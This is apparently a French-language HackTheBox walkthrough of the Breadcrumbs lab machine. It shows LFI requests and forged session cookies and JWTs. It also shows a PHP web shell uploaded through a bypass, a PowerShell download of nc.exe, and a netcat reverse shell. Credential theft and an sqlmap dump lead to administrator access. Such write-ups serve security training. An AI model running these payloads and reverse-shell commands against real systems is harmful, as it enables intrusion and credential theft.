---
title: "HackTheBox - [Breadcrumbs]"
description: Walkthrough de la machine Breadcrumbs sur HackTheBox
---

![Breadcrumbs](https://media.discordapp.net/attachments/490431433559506954/823456907297161266/ezgif.com-gif-maker_6.jpg)


## 0x1 - Nmap

```sh
?-x0ld@emp7 ~/HackTheBox/Breadcrumbs
?-? nmap -sC -sV -T4 -oA scan 10.10.10.228 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 20:46 CET
Nmap scan report for 10.10.10.228
Host is up (0.10s latency).
Not shown: 993 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
| 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after: 2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_ http/1.1
445/tcp open microsoft-ds?
3306/tcp open mysql?
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, Help, Kerberos, LDAPSearchReq, RPCCheck, SIPOptions, SMBProgNeg, SSLSessio
|_ Host '10.10.14.156' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/
SF-Port3306-TCP:V=7.91%I=7%D=3/19%Time=6054FFA2%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVers
SF:ionBindReqTCP,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
SF:DNSStatusRequestTCP,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(Help,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSL
SF:SessionReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Ter
SF:minalServerCookie,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(TLSSessionReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(Kerberos,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(S
SF:MBProgNeg,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11P
SF:robe,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFou
SF:rRequest,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPS
SF:earchReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOp
SF:tions,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(WMSReque
SF:st,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(oracle-tns,
SF:4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.156'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 3m11s
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2021-03-19T19:50:01
|_ start_date: N/A
Service detection performed. Please report any incorrect results
```

On peut apercevoir qu'il y a les ports suivants qui sont ouverts :

```sh
80/http
22/ssh
```

Et un Système d'exploitation Windows.


## 0x2 - Description


Après, quelques temps d'énumération, j'ai vu qu'il y'a une faille ``LFI``, ( Local File Intrusion ) sur la page des books (/php/book.php) et faites une demande de publication pour rechercher un book, modifiez la demande et modifiez la variable de méthode sur 1, puis supprimez le titre et l'auteur et remplacez-les par un livre.


## 0x1 - Foothold




```sh
POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=sj7ktf2u4g6a18doo77vvkl929
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
book=../index.php&method=1
```


Trouvez la ``secret key`` pour les tokens et php pour savoir comment les cookies sont créés en regardant les fichiers pour le portal sign. Lisez le code du cookie.
Après l'avoir lu, nous pouvons en conclure que le ``phpsessid`` est créé par la chaîne de ``hachage md5`` qui a une lettre aléatoire du nom de l'utilisateur.


```sh
POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=sj7ktf2u4g6a18doo77vvkl929
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
book=../portal/cookie.php&method=1
```

Nous obtenons ceci en réponse :


```sh
"<?php\r\n/**\r\n * @param string $username  Username requesting session cookie\r\n * \r\n * @return string $session_cookie Returns the generated cookie\r\n * \r\n * @devteam\r\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\r\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\r\n * */\r\nfunction makesession($username){\r\n    $max = strlen($username) - 1;\r\n    $seed = rand(0, $max);\r\n    $key = "s4lTystR1nG".$username[$seed]."(!528./9890";\r\n    $session_cookie = $username.md5($key);\r\n\r\n    return $session_cookie;\r\n}"
```

Nous obtenons le ``PHPSessionID`` de Paul.


```sh
paul47200b180ccd6835d25d034eeb6e6390
```

Obtenez la secret key en envoyant une demande de request :


```sh
POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=sj7ktf2u4g6a18doo77vvkl929
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34


book=../portal/authController.php&method=1
```

Nous avons obtenu la secret key en réponse:


```sh
$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
```

Avec la secret key que nous venons de trouver, nous allons créer un nouveau ``jeton jwt`` et nous obtenons le jeton suivant:


```sh
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```


Maintenant, allez-vous créer un compte, lorsque vous vous connectez, F12, puis Stockage, et actualisez, cela ressemble à ceci:


![hack](https://media.discordapp.net/attachments/490431433559506954/834032042416013392/unknown.png)


Nous pouvons voir que nous avons accès au ``Panel Admin`` (paul)


![hack](https://media.discordapp.net/attachments/490431433559506954/834032319269437440/unknown.png)


Maintenant, allez dans la gestion des fichiers et téléchargez un script php dans un fichier (peut-être comme reverseshell.html) et interceptez avec ``burpsuite`` et changez le ``.zip`` en bas en .php si vous ne trouvez pas le titre et l'auteur dans un fichier valide livre de fichiers. Comme le bouton "télécharger" ne fonctionne pas, affichez la page suivante pour créer vous-même le package de demande de téléchargement de fichier.


```sh
http://10.10.10.228/portal/assets/js/files.js
```

```sh
POST /portal/includes/fileController.php HTTP/1.1
Host: 10.10.10.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 295


------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.html"
Content-Type: text/html


<?php phpinfo();?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="task"


test.php
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Nous obtenons ceci en réponse :


```sh
HTTP/1.1 200 OK
Date: Tue, 23 Feb 2021 16:37:26 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 30
Connection: close
Content-Type: text/html; charset=UTF-8


Success. Have a great weekend!
```

![h](https://media.discordapp.net/attachments/490431433559506954/823464698409648169/unknown.png)

OK, changez maintenant le phpinfo () comme suit, et ajoutez les html garbage data ci-dessus pour obtenir un shell.


```sh
<?php

system($_GET['cmd']);

?>

<h3>Title: Animal Farm</h3>

<p>Author: George Orwell </p>

<p style="color: red;">Max borrow duration: 8 days</p>

<p>About:<br>Animal Farm is an allegorical novella by George Orwell, first published in England on 17 August 1945. The book tells the story of a group of farm animals who rebel against their human farmer, hoping to create a society where the animals can be equal, free, and happy. </p>
```

Maintenant utilisez netcat pour obtenir un reverse shell.


```sh
?--x0ld@emp7 ~/HackTheBox/Breadcrumbs
?-?  python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.228 - - [23/Feb/2021 12:30:00] "GET /nc.exe HTTP/1.1" 200 -
```


```sh
http://10.10.10.228/portal/uploads/sanity.php?cmd=powershell%20(new-object%20Net.WebClient).DownloadFile(%27http://10.10.14.12/nc.exe%27,%27C://Users//www-data//Desktop//xampp//htdocs//portal//uploads//nc.exe%27)
```


Et là, nous obtenons un reverse shell avec succès.


```sh
http://10.10.10.228/portal/uploads/sanity.php?cmd=nc.exe%2010.10.14.12%203221%20-e%20c:/windows/system32/cmd.exe
```


```sh
?--x0ld@emp7 ~/HackTheBox/Breadcrumbs
?-?  nc -lvp 3221
listening on [any] 3221 ...
Ncat: Connection from 10.10.10.228.
Ncat: Connection from 10.10.10.228:50994.
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads>
```


Après une petite balade dans les directories, j'ai trouvé un "juliette.json".


```sh
C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>type juliette.json
type juliette.json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

Connectez-vous au ssh avec les creds que vous venez de trouver.

```sh
?--x0ld@emp7 ~/HackTheBox/Breadcrumbs  
?-?  ssh juliette@10.10.10.228
juliette@10.10.10.228's password:

juliette@BREADCRUMBS C:\Users\juliette>cd Desktop 
cd Desktop

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type user.txt
7d9068841f1d0a2676a97fe7c0dca4cd
```
Obtenez l'user flag.

## 0x4 - Énumération 

Il peut y avoir des choses intéressantes à propos de "todo.html"

```sh
juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
<html>                                                     
<style>                                                    
html{                                                      
background:black;                                          
color:orange;                                              
}                                                          
table,th,td{                                               
border:1px solid orange;                                   
padding:1em;                                               
border-collapse:collapse;                                  
}                                                          
</style>                                                   
<table>                                                    
        <tr>                                               
            <th>Task</th>                                  
            <th>Status</th>                                
            <th>Reason</th>                                
        </tr>                                              
        <tr>                                               
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>                           
            <td>Unauthorized access might be possible</td> 
        </tr>                                              
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```


Comme nous pouvons le voir, ils nous disent que : "Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager". Cela signifie que nous avons besoin du developement user.
Accédez à l'emplacement sur les fenêtres où se trouvent les sticky notes et téléchargez les 3 fichiers suivants :

```sh
plum.sqlite
plum.sqlite-shm
plum.sqlite-wal
```


```sh
juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

01/15/2021  04:10 PM    <DIR>          .
01/15/2021  04:10 PM    <DIR>          ..
01/15/2021  04:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
11/29/2020  03:10 AM             4,096 plum.sqlite
01/15/2021  04:10 PM            32,768 plum.sqlite-shm
01/15/2021  04:10 PM           329,632 plum.sqlite-wal
               4 File(s)        386,976 bytes
               2 Dir(s)   6,313,762,816 bytes free
```

Vous pouvez utiliser ``Metasploit`` pour avoir un reverse shell et télécharger les fichiers.
Obtenez toutes les notes puis ssh comme développement avec le mot de passe dans le note.


## 0x5 - Privilege Escalation

Accédez à ``C:\Development``

Le binaire "Krypter_Linux" contient des informations qui peuvent nous intéresser, donc pour voir que nous allons utiliser diréctement utiliser ``IDA``.

![hack](https://media.discordapp.net/attachments/490431433559506954/834039127304962094/unknown.png)


Nous pouvons apercevoir que à l'intérieur, il y a une commande et vous pouvez voir ce qu'elle fait lorsque vous la faites.


```sh
http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords 
```

Juste faite un curl et vous obtenez une key ``AES``.

```sh
PS C:\Development> curl http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords


StatusCode        : 200                                                                                               
StatusDescription : OK                                                                                                
Content           : selectarray(1) {                                                                                  
                      [0]=>                                                                                           
                      array(1) {                                                                                      
                        ["aes_key"]=>                                                                                 
                        string(16) "k19D193j.<19391("                                                                 
                      }                                                                                               
                    }
```

Nous utiliserons ``sqlmap`` pour forward le port afin de pouvoir le faire sur kali, nous avons besoin de deux terminaux.

Sur le premier terminal :


```sh
ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228
```

Sur le deuxième terminal :


```sh
curl http://127.0.0.1:1234/index.php\?method\=select\&username\=administrator\&table\=passwords
```

Maintenant, exécutez sqlmap avec –-dump against

```sh
sqlmap -u http://127.0.0.1:1234/index.php\?method\=select\&username\=administrator\&table\=passwords --dump
```

```sh
Database: bread
Table: passwords
[1 entry]
+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+
```

On obtient un mot de passe crypté en ``base64`` avec une ``AES key``, on passe à ``CyberChef`` (notre décodeur/encodeur préfèrer (^^)

Importer ``From Base64`` et importer ``AES Decrypt``
Key en Latin and IV en hexadécimale (iv =0000000000000000).

Comme ceci :


![hack](https://media.discordapp.net/attachments/490431433559506954/834043057208164362/unknown.png)

Et nous obtenons enfin le mot de passe administrateur avec succès :


```sh
p@ssw0rd!@#$9890./
```


```sh
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)AES_Decrypt(%7B'option':'Latin1','string':'k19D193j.%3C19391('%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0
```

Le lien CyberChef qui nous emmène directement au password Administrator : 


```sh
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)AES_Decrypt(%7B'option':'Latin1','string':'k19D193j.%3C19391('%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0
```

ssh administrator :

```sh
?--x0ld@emp7 ~/HackTheBox/Breadcrumbs  
?-?  ssh administrator@10.10.10.228
administrator@10.10.10.228's password: 
Microsoft Windows [Version 10.0.19041.804]
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\Administrator

01/26/2021  10:06 AM    <DIR>          .
01/26/2021  10:06 AM    <DIR>          ..
01/15/2021  04:56 PM    <DIR>          3D Objects 
01/15/2021  04:56 PM    <DIR>          Contacts   
02/09/2021  08:08 AM    <DIR>          Desktop    
01/15/2021  04:56 PM    <DIR>          Documents  
01/15/2021  04:56 PM    <DIR>          Downloads  
01/15/2021  04:56 PM    <DIR>          Favorites  
01/15/2021  04:56 PM    <DIR>          Links      
01/15/2021  04:56 PM    <DIR>          Music      
01/15/2021  05:00 PM    <DIR>          OneDrive   
01/15/2021  04:57 PM    <DIR>          Pictures   
01/15/2021  04:56 PM    <DIR>          Saved Games
01/15/2021  04:57 PM    <DIR>          Searches   
01/15/2021  04:56 PM    <DIR>          Videos     
               0 File(s)              0 bytes     
              15 Dir(s)   3,500,806,144 bytes free

administrator@BREADCRUMBS C:\Users\Administrator>cd Desktop

administrator@BREADCRUMBS C:\Users\Administrator\Desktop>type root.txt
5e6d65093806f0274febf849b09ea8d9
```

Nous sommes enfin root !


## Summary of knowledge :

- Analyse with IDA to analyze binary files.
- Dump secret with Sqlmap.
- Port Forwarding
- LFI ( Local File Intrusion )
- Bypass upload restriction
- PHPSessionID
- JWT token forge

## About-me :

- Post author : x0ld
- Github : [https://github.com/x0ld](https://github.com/x0ld)
- HTB : [https://www.hackthebox.eu/home/users/profile/491690](https://www.hackthebox.eu/home/users/profile/491690)

